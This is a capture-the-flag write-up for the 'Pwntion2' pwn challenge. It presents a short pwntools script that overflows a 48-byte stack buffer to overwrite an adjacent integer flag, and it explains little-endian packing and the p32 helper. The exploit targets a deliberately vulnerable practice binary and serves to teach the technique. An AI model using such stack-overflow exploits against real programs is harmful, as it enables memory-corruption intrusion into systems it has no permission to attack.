# Writeup for Pwntion2

## Task description

**Points: 75**

**Author: maritio_o**

**Difficulty: n00b/easy**

**Category: pwn**

---

_"Remember those lectures about Pwnie? Now is your chance to show what you've
learned!"_
    
—Professor maritio\_o

Our beloved house elf is unfortunate to be vulnerable to the
stack overflow pwntions. 

This time, we want you to take the given ingredients and 
brew the pwntion so that his ears turns equally large as the
nose?

```
nc pwntion2.tghack.no 1062
```

<details><summary>Tips</summary><p> 

1. The file expects to read a file called `banner.txt`. For the binary to
work locally, you should make a file with that name and put whatever you
would like into it.

2. Read the Stack Overflow pt. 2 section in the
Introduction to Pwntions tutorial to learn about this
type of stack overflow problem.
    </p></details>

---

## Writeup

In this task, you are presented with the following files:
* `pwntion2`: binary file
* `pwntion2.c`: C language source code

As the tutorial presents the steps to solve this type of stack overflow 
tasks, I will only present my Python solution script. In the script, I
use **pwntools** to make it easy to setup the script, debug locally on
my machine, and send the solution to the remote server. Here is my 
solution:

```python
from pwn import *

debug = True
if debug == True:
    r = process("./pwntion2")
else:
    r = remote("pwntion2.tghack.no", 1062)

r.recvuntil("Student:\n")
r.sendline("A"*48 + "\x01\x00\x00\x00")

r.interactive()
```

As a short recap, we need to overwrite the values on the stack so that the
`is_magical_question` is changed from 0 to 1. In the script, we do that by 
padding with 48 "A"'s, and then add the hexadecimal value of `1`. We pad 
with 48 because the buffer has room for 48 bytes, and then the next value 
on the stack is the `is_magical_question` value.  

Overwriting the `is_magical_question` variable isn't as straight-forward as 
simply sending 48 A's followed by a 1 like this:
```python
r.sendline("A"*48 + str(1))
```
We have to overwrite the number using a 4-byte little-endian representation of the
number. The value must be 4 bytes, since `int`s are 4-byte in size. Little-endian 
refers to the way values are laid out in system memory. For 32-bit x86, values are 
stored starting with the *least significant byte* first! See [this article on endianness](https://en.wikipedia.org/wiki/Endianness#Little) for more information.

When overwriting data like this, it's common to represent data using hex strings, 
like this:
```python
a = "\x41\x41\x41\x41" # the string AAAA
b = "\xef\xbe\xad\xde"  # the value 0xdeadbeef
```
Note that we start with `\xef`, not `\xde`, since the values are stored in little-endian 
format.
Thus, to represent the value `1` as a 4-byte little-endian value we write it like this: 
`\x01\x00\x00\x00`.

This operation is very common when doing exploit development, so pwntools has some nice 
helper functions for. These are called `p16`, `p32`, and `p64`, and turns numbers into 16, 
32, and 64 bit little-endian byte values, respectively. The p stands for `packed`.

```python
r.sendline("A"*48 + p32(1))
```
